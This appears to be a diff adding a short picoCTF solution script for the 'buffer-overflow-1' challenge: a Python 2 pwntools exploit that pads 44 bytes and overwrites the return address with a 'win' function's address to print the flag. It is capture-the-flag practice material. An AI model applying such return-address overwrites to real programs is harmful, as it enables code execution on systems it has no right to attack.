@@ -1,0 +1,20 @@
+# need to do this by hand and run on the server:
+
+$ssh picoCTF
+$cd /problems/buffer-overflow-1_1_8a16ff6a1b3cfb2e42c08d9090051a5d
+
+$python
+from pwn import *
+
+offset = 44
+# nm vuln | grep win | cut -d " " -f1 # will return this: 080485cb
+
+ret_addr = p32(0x080485cb)
+payload = "A"*offset + ret_addr
+
+p = process("./vuln")
+p.recv()
+p.sendline(payload)
+last_text = p.recv()
+flag = last_text.strip().split("\n")[-1]
+print flag
